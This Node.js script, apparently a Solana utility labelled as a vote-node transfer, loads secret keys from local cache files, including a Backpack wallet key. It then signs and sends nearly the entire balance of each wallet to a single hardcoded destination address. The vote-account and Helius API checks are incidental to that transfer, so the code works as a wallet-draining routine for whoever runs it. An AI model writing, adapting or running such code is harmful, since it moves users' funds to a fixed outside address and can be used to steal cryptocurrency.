#!/usr/bin/env node
require('dotenv').config();
const { Connection, PublicKey, Keypair, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');
const fetch = require('node-fetch');
const fs = require('fs');

const HELIUS_API = process.env.HELIUS_API_KEY;
const DESTINATION = 'ACTvefX67PchHtJbKqayGJntruJ1QXiHwNSgMNNRvoq6';
const VOTE_PROGRAM = 'Vote111111111111111111111111111111111111111';

async function heliusVoteTransfer() {
  console.log('🗳️  HELIUS VOTE NODE TRANSFER');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

  const connection = new Connection(process.env.RPC_URL || 'https://api.mainnet-beta.solana.com', 'confirmed');
  
  console.log(`🎯 Destination: ${DESTINATION}\n`);

  // Load available signers
  const signers = [];
  
  if (fs.existsSync('.cache/user_auth.json')) {
    const keyData = JSON.parse(fs.readFileSync('.cache/user_auth.json'));
    const signer = Keypair.fromSecretKey(new Uint8Array(keyData));
    signers.push({ name: 'Deployer', keypair: signer });
  }

  if (fs.existsSync('.cache/backpack_key.json')) {
    const keyData = JSON.parse(fs.readFileSync('.cache/backpack_key.json'));
    const signer = Keypair.fromSecretKey(new Uint8Array(keyData));
    signers.push({ name: 'Backpack', keypair: signer });
  }

  console.log(`✅ Found ${signers.length} signer(s)\n`);

  const results = {
    timestamp: new Date().toISOString(),
    destination: DESTINATION,
    signers: [],
    voteAccounts: [],
    transfers: []
  };

  // Check each signer
  for (const signer of signers) {
    console.log(`🔍 Checking ${signer.name}: ${signer.keypair.publicKey.toBase58()}\n`);

    const balance = await connection.getBalance(signer.keypair.publicKey);
    console.log(`   Balance: ${(balance / LAMPORTS_PER_SOL).toFixed(9)} SOL`);

    results.signers.push({
      name: signer.name,
      address: signer.keypair.publicKey.toBase58(),
      balance: balance / LAMPORTS_PER_SOL
    });

    // Check for vote accounts
    try {
      const accounts = await connection.getProgramAccounts(
        new PublicKey(VOTE_PROGRAM),
        {
          filters: [
            { memcmp: { offset: 4, bytes: signer.keypair.publicKey.toBase58() } }
          ]
        }
      );

      if (accounts.length > 0) {
        console.log(`   🗳️  Vote Accounts: ${accounts.length}`);
        accounts.forEach(acc => {
          console.log(`      ${acc.pubkey.toBase58()}`);
          results.voteAccounts.push({
            owner: signer.name,
            address: acc.pubkey.toBase58()
          });
        });
      } else {
        console.log(`   No vote accounts found`);
      }
    } catch (e) {
      console.log(`   ⚠️  Vote check: ${e.message}`);
    }

    // Transfer SOL if available
    if (balance > 5000) {
      console.log(`\n   🔄 Transferring SOL...`);
      
      try {
        const transferAmount = balance - 5000;
        const transaction = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: signer.keypair.publicKey,
            toPubkey: new PublicKey(DESTINATION),
            lamports: transferAmount
          })
        );

        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = signer.keypair.publicKey;
        transaction.sign(signer.keypair);

        const signature = await connection.sendRawTransaction(transaction.serialize());
        await connection.confirmTransaction(signature);

        console.log(`   ✅ Transfer complete: ${signature}`);
        console.log(`   🔗 https://explorer.solana.com/tx/${signature}\n`);

        results.transfers.push({
          from: signer.name,
          amount: transferAmount / LAMPORTS_PER_SOL,
          signature,
          status: 'success'
        });

      } catch (error) {
        console.log(`   ❌ Transfer failed: ${error.message}\n`);
        results.transfers.push({
          from: signer.name,
          error: error.message,
          status: 'failed'
        });
      }
    } else {
      console.log(`   ⚠️  Insufficient balance for transfer\n`);
    }
  }

  // Check Helius for additional data
  if (HELIUS_API) {
    console.log('🔍 CHECKING HELIUS API:\n');
    
    for (const signer of signers) {
      try {
        const response = await fetch(
          `https://api.helius.xyz/v0/addresses/${signer.keypair.publicKey.toBase58()}/transactions?api-key=${HELIUS_API}`
        );
        
        if (response.ok) {
          const data = await response.json();
          console.log(`   ${signer.name}: ${data.length || 0} transactions found`);
        }
      } catch (e) {
        console.log(`   ${signer.name}: API check failed`);
      }
    }
    console.log('\n');
  }

  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log('📊 SUMMARY');
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log(`✅ Signers Checked: ${results.signers.length}`);
  console.log(`🗳️  Vote Accounts Found: ${results.voteAccounts.length}`);
  console.log(`💰 Transfers Completed: ${results.transfers.filter(t => t.status === 'success').length}`);
  console.log(`🎯 Destination: ${DESTINATION}`);
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');

  fs.writeFileSync('.cache/helius-vote-transfer.json', JSON.stringify(results, null, 2));
  console.log('\n✅ Results saved to .cache/helius-vote-transfer.json');
}

heliusVoteTransfer().catch(console.error);
